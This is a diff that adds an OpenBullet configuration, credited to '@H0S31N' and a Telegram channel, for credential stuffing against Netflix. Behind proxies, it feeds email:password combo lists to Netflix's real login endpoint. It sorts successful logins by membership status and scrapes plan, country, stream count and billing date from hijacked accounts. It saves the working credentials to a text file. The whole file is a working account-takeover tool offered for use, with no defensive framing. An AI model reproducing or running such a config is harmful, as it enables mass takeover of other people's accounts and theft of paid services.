@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "NetFlix",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-21T00:31:51.1665405+02:00",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Needs  Proxy |Combo Type: Email:Pass | Save Hits (Text File) in OpenBullet Folder ( Open Netflix.txt with NotePad ++ ) | Capture Type:  ( Plan _ Country _  Free Trial _ DVD _ Max Streams _ Has HD _ Has Ultra HD _  Next Billing Date | Move Free To Custom",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.netflix.com/ph-en/Login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+
+#Auth PARSE "<SOURCE>" LR "name=\"authURL\" value=\"" "\"" -> VAR "AUTH" 
+
+#En_Auth FUNCTION URLEncode "<AUTH>" -> VAR "Encode" 
+
+#Post REQUEST POST "https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount" 
+  CONTENT "authURL=<Encode>&email=<USER>&password=<PASS>&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&rememberMe=True&flow=websiteSignUp&mode=login&action=loginAction&nextPage=https%3A%2F%2Fwww.netflix.com%2FYourAccount&showPassword=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Referer: https://www.netflix.com/ph-en/Login" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"unrecognized_email\"},\"" 
+    KEY "\"value\":\"incorrect_password\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"membershipStatus\":\"CURRENT_MEMBER\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"membershipStatus\":\"NEVER_MEMBER\"" 
+    KEY "\"membershipStatus\":\"FORMER_MEMBER\"" 
+
+#Current_Plan PARSE "<SOURCE>" LR "\"currentPlanName\":\"" "\"" -> CAP "Current Plan" 
+
+#Free_Trial PARSE "<SOURCE>" LR "\"isInFreeTrial\":" "," -> CAP "Trial" 
+
+#Country PARSE "<SOURCE>" LR "\",\"currentCountry\":\"" "\"" -> CAP "Country" 
+
+#DVD PARSE "<SOURCE>" LR "\"isDVD\":" "," -> CAP "DVD" 
+
+#HD PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "HD" 
+
+#Ultra_HD PARSE "<SOURCE>" LR "\"hasUHD\":" "," -> CAP "Ultra HD" 
+
+#Stream PARSE "<SOURCE>" LR "\"maxStreams\":" "," -> CAP "Stream" 
+
+#Billing PARSE "<SOURCE>" LR "\"nextBillingDate\":\"" "\"" -> VAR "Billing" 
+
+#Nex_Billing FUNCTION Replace "\\x2F" "/" "<Billing>" -> CAP "Next Billing" 
+
+#CC FUNCTION Constant "@BruteForce" -> CAP " Telegram Channel: " 
+
+UTILITY File "Netflix.txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER>:<PASS>\\nEmail:  <USER>\\nPassword: <PASS>\\n<<<<<<=Information=>>>>>\\nPlan: <Current Plan>\\nCountry: <Country>\\nFree Trial: <Trial>\\nDVD: <DVD>\\nMax Streams: <Stream>\\nHas HD: <HD>\\nHas Ultra HD: <Ultra HD>\\nNext Billing Date: <Next Billing>\\n<<<<<<=Credit=>>>>>>\\nConfiged By @H0S31N | Telegram Channel: T.me/BruteForce \\n==============================================" -> VAR "Save" 
+
